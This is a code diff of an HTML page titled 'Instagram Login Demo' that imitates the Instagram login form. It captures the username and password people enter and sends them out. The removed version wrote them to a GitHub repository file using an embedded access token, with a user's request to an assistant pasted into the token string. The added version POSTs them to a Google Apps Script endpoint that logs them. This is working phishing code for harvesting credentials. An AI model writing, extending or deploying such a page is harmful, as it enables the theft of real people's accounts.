@@ -5,7 +5,7 @@
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>Instagram Login Demo</title>
     <style>
-        /* General reset */
+        /* General Reset */
         body, html {
             margin: 0;
             padding: 0;
@@ -153,51 +153,29 @@
             document.getElementById("login-container").style.display = "flex";
         }
 
-        // Save login details to GitHub
-        async function saveLoginDetailsToGitHub(username, password) {
-            const owner = "Devjaat12356"; // Replace with your GitHub username
-            const repo = "Demo-login"; // Replace with your GitHub repo name
-            const filePath = "login-data.json";  // The file where login data is stored
-            const token = "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 now give me fully updated code and explained it how it works"; // Replace with your GitHub token
+        // Save login details to Google Sheets
+        async function saveLoginDetailsToGoogleSheets(username, password) {
+            const googleSheetsURL = "https://script.google.com/macros/s/AKfycbxjh10gE6RJmgF-I_F4RiS24aHTC7Ie8vXi-XY-Cnpb5vihepPyZFdA86pyuz3KmlrrrQ/exec";
 
-            const apiUrl = `https://api.github.com/repos/${owner}/${repo}/contents/${filePath}`;
+            const payload = {
+                username: username,
+                password: password,
+            };
 
             try {
-                // Step 1: Fetch current file content from GitHub
-                const response = await fetch(apiUrl, {
+                const response = await fetch(googleSheetsURL, {
+                    method: "POST",
                     headers: {
-                        Authorization: `token ${token}`,
-                    },
-                });
-
-                const fileData = await response.json();
-                const content = atob(fileData.content || "[]"); // Decode base64 content
-
-                // Step 2: Add new login details
-                const loginData = JSON.parse(content);
-                loginData.push({ username, password, timestamp: new Date().toISOString() });
-
-                // Step 3: Encode updated content in base64
-                const updatedContent = btoa(JSON.stringify(loginData, null, 2));
-
-                // Step 4: Update file on GitHub
-                const updateResponse = await fetch(apiUrl, {
-                    method: "PUT",
-                    headers: {
-                        Authorization: `token ${token}`,
                         "Content-Type": "application/json",
                     },
-                    body: JSON.stringify({
-                        message: "Updated login data",
-                        content: updatedContent,
-                        sha: fileData.sha, // File SHA is required for updates
-                    }),
+                    body: JSON.stringify(payload),
                 });
 
-                if (updateResponse.ok) {
+                const result = await response.json();
+                if (result.status === "success") {
                     console.log("Login details saved successfully!");
                 } else {
-                    console.error("Failed to save login details.");
+                    console.error("Failed to save login details:", result.message);
                 }
             } catch (error) {
                 console.error("Error:", error);
@@ -211,7 +189,7 @@
             const username = document.getElementById("username").value;
             const password = document.getElementById("password").value;
 
-            saveLoginDetailsToGitHub(username, password);
+            saveLoginDetailsToGoogleSheets(username, password);
 
             // Switch to timer screen
             document.getElementById("login-container").style.display = "none";
